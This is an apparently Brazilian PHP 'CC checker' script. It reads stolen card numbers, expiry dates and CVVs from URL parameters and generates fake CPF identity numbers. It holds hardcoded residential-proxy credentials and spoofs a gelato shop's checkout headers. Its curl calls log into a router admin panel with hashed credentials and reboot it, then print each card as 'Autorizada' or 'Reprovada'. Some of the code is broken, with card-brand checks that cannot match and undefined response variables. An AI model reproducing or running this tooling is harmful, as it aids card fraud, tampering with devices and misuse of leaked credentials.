
<?php
ini_set("display_errors",0);
error_reporting(0);
include("verifica.php");
if($_GET["acao"] == logout){
setcookie("logado","");
echo'
<script type="text/javascript">
alert("Você foi deslogado com sucesso, redirecionando...");
location="index.php";
</script>
';
}
?>
<?php
error_reporting(0);
set_time_limit(0);
   function value($string, $start, $end){
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
    }
function getstr($string, $start, $end, $offset = 1) {
    $str = explode($start, $string);
    $str = explode($end, $str[$offset]);
    return $str[0];
}
    

if($_GET['testar']=="cc"){
    $ccs = $_GET['ccs'];
    $separador  = $_GET['separador'];
    $id     = $_GET['id'];
    $explode = explode($separador, $ccs);


$numero = $explode[0];
$mes = $explode[1];
$ano = $explode[2];
$cvv = $explode[3];
$cc = substr($numero,0,6);
$random = mt_rand(1,1000);

$ss = substr($numero, 0, 2);


if($ss[0] == "4"){
$bandeira = "Visa";
}

elseif($ss[0] == "5"){
$bandeira = "Mastercard";
}

elseif($ss[0] == "37"){
$bandeira = "American Express";
}

elseif($ss[0] == "60"){
$bandeira = "Discover";
}
	elseif($ss[0] == "36"){
$bandeira = "diners";
}	 
     } 


$username = 'lum-customer-hl_5056b531-zone-static';
$password = 'wtkmwp7fan9w';
$port = 22225;
$user_agent = 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko';
$session = mt_rand();
$super_proxy = 'zproxy.lum-superproxy.io';
$random = mt_rand();
$random_cvv = mt_rand(111,999);

     
 $num = array();
    $num[9]=$num[10]=$num[11]=0;
    for ($w=0; $w > -2; $w--){
        for($i=$w; $i < 9; $i++){
            $x=($i-10)*-1;
            $w==0?$num[$i]=rand(0,9):'';
           
            ($w==-1 && $i==$w && $num[11]==0)?
                $num[11]+=$num[10]*2    :
                $num[10-$w]+=$num[$i-$w]*$x;
        }
        $num[10-$w]=(($num[10-$w]%11)<2?0:(11-($num[10-$w]%11)));
       $cpf = ''.$num[0].$num[1].$num[2].'.'.$num[3].$num[4].$num[5].'.'.$num[6].$num[7].$num[8].'-'.$num[10].$num[11];
    }


        


if(file_exists(getcwd().'/cookiess.txt')) {
        unlink(getcwd().'/cookiess.txt'); 
    }
 
 
 $str12 = "abcdefasdfv";
$nome_random1 = str_shuffle($str12);


$randomId = mt_rand(1,99999);
$phonenumberrand = mt_rand(0000000000,9999999999);
$str = "AaBbCcDdEeF";
$codigoss = str_shuffle($str);

$valordedebito = mt_rand(10,20);
$cvvrand = mt_rand(000,999);
$cvvrand1 = mt_rand(00000,999999);






	
	

	
		 $ch = curl_init();
	
    curl_setopt($ch, CURLOPT_URL,'http://192.168.15.1/login.cgi');
	
    $headr = array();
    $headr[] = 'Host: www.paolosgelatogourmet.com';
    $headr[] = 'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0';
	$headr[] = 'Accept: application/json, text/javascript, /; q=0.01';
	$headr[] = 'Referer: https://www.paolosgelatogourmet.com/index.php?route=checkout/checkout';
    //curl_setopt($ch, CURLOPT_HTTPHEADER,$headr);
    //curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
    //curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-country-br-dns-local-session-$session:$password");
	curl_setopt($ch, CURLOPT_TIMEOUT,15);
    curl_setopt($ch, CURLOPT_HEADER,0);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION,1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER,0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST,0);
    curl_setopt($ch, CURLOPT_VERBOSE,1);
    curl_setopt($ch, CURLOPT_COOKIESESSION,false);
    curl_setopt($ch, CURLOPT_COOKIEJAR,getcwd().'/cookiess.txt');
    curl_setopt($ch, CURLOPT_COOKIEFILE,getcwd().'/cookiess.txt');
    curl_setopt($ch, CURLOPT_POST,true);
    curl_setopt($ch, CURLOPT_POSTFIELDS,'usernameEncrypt=21232f297a57a5a743894a0e4a801fc3&passwordEncrypt=29fdbe21134f924570d36c41bc3f50e2&loginW=0&loginfrompadrao=0&submit.htm%3Fidx_select.htm=Send');
	$curl = curl_exec($ch); // Resultado
	//$payment_resposta1 = getStr($curl, '"error":"','"',1);
	//$hashid = getStr($curl
	
	
	
	
			 $ch = curl_init();
	
    curl_setopt($ch, CURLOPT_URL,'http://192.168.15.1/form2Reboot.cgi');
	
    $headr = array();
    $headr[] = 'Host: www.paolosgelatogourmet.com';
    $headr[] = 'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0';
	$headr[] = 'Accept: application/json, text/javascript, /; q=0.01';
	$headr[] = 'Referer: https://www.paolosgelatogourmet.com/index.php?route=checkout/checkout';
    //curl_setopt($ch, CURLOPT_HTTPHEADER,$headr);
    //curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
    //curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-country-br-dns-local-session-$session:$password");
	curl_setopt($ch, CURLOPT_TIMEOUT,15);
    curl_setopt($ch, CURLOPT_HEADER,0);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION,1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER,0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST,0);
    curl_setopt($ch, CURLOPT_VERBOSE,1);
    curl_setopt($ch, CURLOPT_COOKIESESSION,false);
    curl_setopt($ch, CURLOPT_COOKIEJAR,getcwd().'/cookiess.txt');
    curl_setopt($ch, CURLOPT_COOKIEFILE,getcwd().'/cookiess.txt');
    curl_setopt($ch, CURLOPT_POST,true);
    curl_setopt($ch, CURLOPT_POSTFIELDS,'rebootflag=1&save=1&submit.htm%3Fdevice-management-resets.html=Send');
	$curl = curl_exec($ch); // Resultado
	//$payment_resposta1 = getStr($curl, '"error":"','"',1);
	//$hashid = getStr($curl
	
	echo $curl;
	
 

	
	
	//%2B%2B%2B
	
	
		
	 

	
	
	



	




         // $dados = curl_exec($ch);
          //  $token = getStr($dados, '"id":"','",');
   
        //Subscription Complete
        if(strpos($curl, "success")!==false){

		echo" Autorizada - $numero $mes $ano $cvv $payment_resposta [ $bindacc | $bandeiradacc | $typedacc | $leveldacc | $bancodacc | $paisdacc ] [Payment resposta: $payment_resposta1] #AlexinChecker <br>";

   }
      
   else{ 
   
    echo" Reprovada - $numero $mes $ano $cvv $payment_resposta Resposta do pagamento: $payment_resposta1 #CC INVALIDA <br>";
 

          
    }

	
		if(file_exists(getcwd().'/testeasd.txt')) {
        unlink(getcwd().'/testeasd.txt'); 
    }
	


?>